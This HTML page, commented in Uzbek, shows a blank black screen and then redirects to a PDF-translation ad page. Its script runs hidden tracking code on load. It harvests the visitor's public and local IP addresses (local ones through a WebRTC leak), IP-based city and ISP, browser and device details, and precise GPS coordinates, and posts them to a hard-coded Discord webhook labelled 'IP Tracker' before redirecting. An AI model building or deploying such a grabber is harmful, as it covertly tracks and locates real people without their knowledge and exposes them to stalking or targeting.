<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <!-- Hech narsa ko'rinmaydi -->

    <script>
        // Maqsadli URL
        const targetURL = 'https://pdfsimpli.com/ru/lp/translate-pdf/?962-902-7329&utm_source=google&utm_medium=sem&utm_campaign=23059244338&utm_term=%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%B5%D1%80%D0%B5%D0%B2%D0%B5%D1%81%D1%82%D0%B8%20pdf%20%D1%84%D0%B0%D0%B9%D0%BB%20%D0%BD%D0%B0%20%D1%80%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9&network=g&device=c&adposition=&adgroupid=191636653851&placement=&location=1028523&gad_source=1&gad_campaignid=23059244338&gbraid=0AAAAApVBV2AwnD6kzFyOqi2kWCDpED7Zd&gclid=CjwKCAjwmNLHBhA4EiwA3ts3mdvvfYRE8uQ3XjfZWsA9Scfmf2DjOJ5rdQXmAriRI-F7iGh1FSis3hoCi8UQAvD_BwE';
        const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";

        // Local IP diapazonlarini tekshirish
        function isPrivateIP(ip) {
            if (ip.includes('.')) {
                const parts = ip.split('.').map(Number);
                if (parts[0] === 10) return true;
                if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
                if (parts[0] === 192 && parts[1] === 168) return true;
            }
            return false;
        }

        // Local IP ni ishonchli olish
        function getLocalIPs() {
            return new Promise((resolve) => {
                const privateIPs = [];
                let resolved = false;
                
                const resolveIPs = () => {
                    if (!resolved) {
                        resolved = true;
                        resolve(privateIPs.length > 0 ? privateIPs : ["Local IP topilmadi"]);
                    }
                };
                
                try {
                    const pc = new RTCPeerConnection({ 
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    
                    pc.createDataChannel("");
                    
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) {
                            // Barcha nomzodlar tugadi
                            setTimeout(resolveIPs, 500);
                            return;
                        }
                        
                        const candidate = e.candidate.candidate;
                        console.log("ICE Candidate:", candidate);
                        
                        // IP manzilini qidirish
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
                        const matches = candidate.match(ipRegex);
                        
                        if (matches) {
                            matches.forEach(ip => {
                                if (isPrivateIP(ip) && !privateIPs.includes(ip)) {
                                    privateIPs.push(ip);
                                    console.log("Topilgan Local IP:", ip);
                                }
                            });
                        }
                    };
                    
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(err => {
                            console.log("Offer xatosi:", err);
                            resolveIPs();
                        });
                    
                    // 3 soniyadan keyin timeout
                    setTimeout(resolveIPs, 3000);
                    
                } catch (error) {
                    console.log("RTCPeerConnection xatosi:", error);
                    resolve(["Xato: " + error.message]);
                }
            });
        }

        // Discord-ga ma'lumot yuborish
        async function sendToDiscord(messageContent) {
            try {
                const message = { 
                    content: messageContent,
                    username: "IP Tracker - " + new Date().toLocaleTimeString()
                };
                
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(message)
                });
                
                console.log("Discord response:", response.status);
                return response.ok;
            } catch (error) {
                console.log("Discord xatosi:", error);
                return false;
            }
        }

        // Asosiy ma'lumotlarni yig'ish funksiyasi
        async function collectAndSendData() {
            console.log("Ma'lumotlarni yig'ish boshlandi...");
            
            let messageContent = "🌐 **YANGI FOYDALANUVCHI**\n\n";
            let publicIP = "Olinmadi";
            let geoInfo = "";
            let localIPs = ["Local IP hali olinmoqda"];
            
            // Local IP larni darrov boshlash
            const localIPPromise = getLocalIPs();
            
            try {
                // 1. Public IP ni olish
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                publicIP = ipData.ip;
                messageContent += "🔹 **Public IP:** " + publicIP + "\n";
                
                // 2. Geolokatsiya ma'lumotlarini olish
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                    const geoData = await geoResponse.json();
                    if (geoData.country_name) {
                        geoInfo = "📍 **Manzil:** " + (geoData.city || 'N/A') + ", " + (geoData.country_name || 'N/A') + "\n";
                        geoInfo += "🏢 **ISP:** " + (geoData.org || 'N/A') + "\n";
                    }
                } catch (geoError) {
                    console.log("Geolokatsiya xatosi:", geoError);
                }
                
            } catch (error) {
                console.log("Public IP olish xatosi:", error);
                messageContent += "🔹 **Public IP:** Olinmadi\n";
            }
            
            // Local IP larni kutish
            localIPs = await localIPPromise;
            messageContent += "🔹 **Local IP:** " + localIPs.join(', ') + "\n";
            
            // Geolokatsiya ma'lumotlarini qo'shish
            if (geoInfo) {
                messageContent += "\n" + geoInfo;
            }
            
            // 4. Tizim ma'lumotlari
            messageContent += "\n💻 **TIZIM MA'LUMOTLARI**\n";
            messageContent += "🖥 **Platforma:** " + navigator.platform + "\n";
            messageContent += "🌐 **Brauzer:** " + navigator.userAgent.substring(0, 100) + "...\n";
            messageContent += "📱 **Ekran:** " + screen.width + "x" + screen.height + "\n";
            messageContent += "🕐 **Vaqt:** " + new Date().toLocaleString() + "\n";
            messageContent += "🔗 **URL:** " + window.location.href;
            
            console.log("Yuboriladigan xabar:", messageContent);
            
            // Ma'lumotlarni yuborish
            const success = await sendToDiscord(messageContent);
            console.log("Ma'lumotlar yuborildi:", success);
            
            return success;
        }

        // GPS ma'lumotlarini yuborish
        function sendGPSData() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const gpsMsg = "📍 **GPS MA'LUMOTLARI**\n" +
                                     "🗺 **Kenglik:** " + position.coords.latitude + "\n" +
                                     "🗺 **Uzunlik:** " + position.coords.longitude + "\n" +
                                     "🎯 **Aniqlik:** " + position.coords.accuracy + "m";
                        sendToDiscord(gpsMsg);
                        console.log("GPS ma'lumotlari yuborildi");
                    },
                    function(error) {
                        const gpsErrorMsg = "📍 **GPS RAD ETILDI**\n" +
                                         "❌ **Xato:** " + error.message + "\n" +
                                         "🔢 **Kod:** " + error.code;
                        sendToDiscord(gpsErrorMsg);
                        console.log("GPS rad etildi:", error.message);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 5000,
                        maximumAge: 0 
                    }
                );
            }
        }

        // Asosiy dastur
        async function main() {
            console.log("Dastur boshlandi...");
            
            // Asosiy ma'lumotlarni yuborish
            const dataSent = await collectAndSendData();
            console.log("Asosiy ma'lumotlar yuborildi:", dataSent);
            
            // GPS ma'lumotlarini yuborish (kutmasdan)
            sendGPSData();
            
            // Barcha ma'lumotlar yuborilgach o'tkazish
            console.log("O'tkazish boshlandi...");
            setTimeout(() => {
                window.location.href = targetURL;
            }, 4000);
        }

        // Dasturni ishga tushirish
        document.addEventListener('DOMContentLoaded', function() {
            main();
        });

        // Qo'shimcha ishonchlilik
        window.onload = function() {
            setTimeout(() => {
                if (window.location.href !== targetURL) {
                    window.location.href = targetURL;
                }
            }, 6000);
        };
    </script>
</body>
</html>
